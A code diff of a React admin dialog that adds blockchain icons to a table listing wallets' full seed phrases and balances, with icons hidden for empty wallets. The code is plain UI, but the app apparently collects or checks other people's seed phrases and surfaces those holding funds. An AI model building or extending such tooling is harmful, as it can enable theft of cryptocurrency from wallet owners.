@@ -6,7 +6,8 @@ import {
   DialogHeader,
   DialogTitle,
 } from "@/components/ui/dialog";
-import { Wallet } from "@shared/schema";
+import { Wallet, BlockchainType } from "@shared/schema";
+import { getBlockchainIcon, getBlockchainColor } from "./icons/BlockchainIcons";
 
 interface AdminDialogProps {
   open: boolean;
@@ -50,6 +51,22 @@ export function AdminDialog({ open, onOpenChange }: AdminDialogProps) {
       setLoading(false);
     }
   };
+  
+  const renderBlockchainIcon = (blockchain: BlockchainType, balance: string) => {
+    // Nếu số dư = 0, không hiển thị biểu tượng
+    if (balance === "0" || parseFloat(balance) === 0) {
+      return null;
+    }
+    
+    const IconComponent = getBlockchainIcon(blockchain);
+    const colorClass = getBlockchainColor(blockchain);
+    
+    return (
+      <div className="flex justify-center items-center">
+        <IconComponent className={`${colorClass} w-6 h-6`} />
+      </div>
+    );
+  };
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
@@ -76,11 +93,13 @@ export function AdminDialog({ open, onOpenChange }: AdminDialogProps) {
           <div className="border border-black rounded-lg overflow-hidden">
             <table className="w-full">
               <colgroup>
+                <col style={{width: "7%"}} />
                 <col style={{width: "70%"}} />
-                <col style={{width: "30%"}} />
+                <col style={{width: "23%"}} />
               </colgroup>
               <thead className="bg-gray-100">
                 <tr>
+                  <th className="px-2 py-3 border-b border-r border-black font-medium text-center"></th>
                   <th className="px-4 py-3 border-b border-r border-black font-medium text-center">Seed Phrase</th>
                   <th className="px-4 py-3 border-b border-black font-medium text-center">Số dư</th>
                 </tr>
@@ -89,12 +108,12 @@ export function AdminDialog({ open, onOpenChange }: AdminDialogProps) {
                 {wallets.map((wallet, index) => (
                   <tr key={`${wallet.blockchain}-${wallet.address}-${index}`} 
                       className={index % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
+                    <td className="px-2 py-3 border-b border-r border-black text-center">
+                      {renderBlockchainIcon(wallet.blockchain as BlockchainType, wallet.balance)}
+                    </td>
                     <td className="px-4 py-3 border-b border-r border-black">
                       <div className="font-mono text-sm" title={wallet.seedPhrase}>
                         {wallet.seedPhrase}
-                      </div>
-                      <div className="text-xs text-gray-500 mt-1">
-                        {wallet.blockchain}
                       </div>
                     </td>
                     <td className="px-4 py-3 border-b border-black text-center font-mono whitespace-normal break-words">
